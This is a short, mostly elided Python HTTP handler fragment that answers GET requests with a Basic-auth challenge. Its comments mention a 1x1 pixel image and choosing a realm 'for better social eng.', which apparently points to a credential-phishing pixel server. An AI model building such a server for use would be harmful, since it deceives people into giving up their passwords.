...
class MyHandler(BaseHTTPRequestHandler):
    ...
    def do_GET(self):
        ...
        if authheadindex:
            ...
            self.send_header('Content-type', 'text/plain') #TODO: send 1x1px Image blob
        else:
            ...
            self.send_header('WWW-Authenticate', 'Basic realm="insert realm"') #provide a realm for better social eng.
